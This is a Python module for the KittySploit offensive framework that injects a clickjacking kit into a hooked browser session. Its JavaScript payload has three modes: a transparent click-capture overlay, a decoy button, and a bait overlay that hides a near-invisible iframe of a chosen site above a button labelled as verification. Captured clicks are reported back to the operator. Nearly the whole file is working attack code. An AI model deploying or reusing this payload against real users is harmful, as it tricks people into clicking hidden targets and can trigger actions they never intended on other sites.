from kittysploit import *
import json
import uuid


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Overlay / Clickjacking Kit",
		"description": "Inject clickjacking overlays: bait iframe, full-page click capture, or decoy button",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	mode = OptString(
		"bait",
		"Mode: bait | capture | decoy",
		False,
	)
	target_url = OptString(
		"https://example.com/",
		"URL loaded in the invisible/bait iframe (bait mode)",
		False,
	)
	decoy_label = OptString("Click to continue", "Visible decoy button label", False)
	opacity = OptString("0.01", "Overlay iframe opacity (bait mode, 0-1)", False)
	listen_seconds = OptInteger(15, "Seconds to collect click events before returning", False)
	remove_existing = OptBool(True, "Remove any previous KittySploit overlay first", False)

	def run(self):
		mode = str(self.mode or "bait").strip().lower()
		if mode not in ("bait", "capture", "decoy"):
			print_error("mode must be bait, capture, or decoy")
			return False

		try:
			opacity = float(str(self.opacity or "0.01"))
		except ValueError:
			print_error("opacity must be a number")
			return False
		opacity = max(0.0, min(1.0, opacity))
		listen_s = max(1, int(self.listen_seconds or 15))
		job_id = str(uuid.uuid4())[:8]

		code_js = f"""
		(function() {{
			const MODE = {json.dumps(mode)};
			const TARGET = {json.dumps(str(self.target_url or "https://example.com/"))};
			const DECOY = {json.dumps(str(self.decoy_label or "Click to continue"))};
			const OPACITY = {opacity};
			const LISTEN_MS = {listen_s * 1000};
			const REMOVE = {str(self._to_bool(self.remove_existing)).lower()};
			const JOB = {json.dumps(job_id)};

			if (REMOVE) {{
				['ks-cj-root', 'ks-cj-capture', 'ks-cj-decoy'].forEach(function(id) {{
					const el = document.getElementById(id);
					if (el) el.remove();
				}});
			}}

			const clicks = [];
			function record(ev, meta) {{
				clicks.push({{
					x: ev.clientX,
					y: ev.clientY,
					type: ev.type,
					target: (ev.target && (ev.target.id || ev.target.tagName)) || null,
					meta: meta || null,
					ts: Date.now()
				}});
			}}

			return new Promise(function(resolve) {{
				if (MODE === 'capture') {{
					const overlay = document.createElement('div');
					overlay.id = 'ks-cj-capture';
					overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483646;background:transparent;cursor:crosshair;';
					overlay.addEventListener('click', function(ev) {{
						ev.preventDefault();
						ev.stopPropagation();
						record(ev, 'capture');
					}}, true);
					document.documentElement.appendChild(overlay);
					setTimeout(function() {{
						overlay.remove();
						resolve(JSON.stringify({{
							ok: true, mode: MODE, job: JOB, clicks: clicks,
							page_url: location.href, note: 'Transparent click-capture overlay removed'
						}}));
					}}, LISTEN_MS);
					return;
				}}

				if (MODE === 'decoy') {{
					const root = document.createElement('div');
					root.id = 'ks-cj-decoy';
					root.style.cssText = 'position:fixed;inset:0;z-index:2147483646;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.35);font-family:system-ui,sans-serif;';
					const btn = document.createElement('button');
					btn.textContent = DECOY;
					btn.style.cssText = 'padding:14px 28px;font-size:16px;border:0;border-radius:8px;background:#2563eb;color:#fff;cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,.25);';
					btn.addEventListener('click', function(ev) {{
						record(ev, 'decoy');
						btn.textContent = 'Thanks…';
						btn.disabled = true;
					}});
					root.appendChild(btn);
					document.documentElement.appendChild(root);
					setTimeout(function() {{
						root.remove();
						resolve(JSON.stringify({{
							ok: true, mode: MODE, job: JOB, clicks: clicks,
							page_url: location.href
						}}));
					}}, LISTEN_MS);
					return;
				}}

				// bait: visible decoy under nearly-invisible iframe pointing at TARGET
				const root = document.createElement('div');
				root.id = 'ks-cj-root';
				root.style.cssText = 'position:fixed;inset:0;z-index:2147483646;display:flex;align-items:center;justify-content:center;background:rgba(15,23,42,.45);font-family:system-ui,sans-serif;';

				const stage = document.createElement('div');
				stage.style.cssText = 'position:relative;width:320px;height:120px;';

				const decoy = document.createElement('button');
				decoy.textContent = DECOY;
				decoy.style.cssText = 'position:absolute;inset:0;width:100%;height:100%;padding:0;font-size:16px;border:0;border-radius:10px;background:#16a34a;color:#fff;cursor:pointer;';
				decoy.addEventListener('click', function(ev) {{ record(ev, 'decoy-under'); }});

				const frame = document.createElement('iframe');
				frame.src = TARGET;
				frame.setAttribute('sandbox', 'allow-forms allow-scripts allow-same-origin allow-popups');
				frame.style.cssText = 'position:absolute;inset:0;width:100%;height:100%;border:0;border-radius:10px;opacity:' + OPACITY + ';z-index:2;';
				frame.addEventListener('load', function() {{
					clicks.push({{ type: 'iframe-load', meta: TARGET, ts: Date.now() }});
				}});

				stage.appendChild(decoy);
				stage.appendChild(frame);
				root.appendChild(stage);

				const hint = document.createElement('div');
				hint.style.cssText = 'position:absolute;bottom:24px;left:0;right:0;text-align:center;color:#e2e8f0;font-size:12px;opacity:.7;';
				hint.textContent = 'Verification overlay';
				root.appendChild(hint);

				document.documentElement.appendChild(root);
				document.addEventListener('click', function(ev) {{
					if (root.contains(ev.target)) record(ev, 'bait-root');
				}}, true);

				setTimeout(function() {{
					root.remove();
					resolve(JSON.stringify({{
						ok: true,
						mode: MODE,
						job: JOB,
						target_url: TARGET,
						opacity: OPACITY,
						clicks: clicks,
						page_url: location.href,
						note: 'Bait overlay removed after listen window'
					}}));
				}}, LISTEN_MS);
			}});
		}})();
		"""

		print_status(f"Deploying clickjack overlay mode={mode} for {listen_s}s...")
		result = self.send_js_and_wait_for_response(code_js, timeout=float(listen_s + 10))
		if not result:
			print_error("Failed to run overlay clickjack kit")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse response: {exc}")
			return False

		print_info("=" * 60)
		print_info("Overlay / Clickjacking")
		print_info(f"  Mode: {data.get('mode')}")
		print_info(f"  Page: {data.get('page_url')}")
		if data.get("target_url"):
			print_info(f"  Iframe target: {data.get('target_url')}")
		clicks = data.get("clicks") or []
		print_success(f"  Events captured: {len(clicks)}")
		for ev in clicks[:25]:
			print_info(
				f"    {ev.get('type')} @ ({ev.get('x')},{ev.get('y')}) "
				f"meta={ev.get('meta')} target={ev.get('target')}"
			)
		if data.get("note"):
			print_info(f"  {data['note']}")
		return True
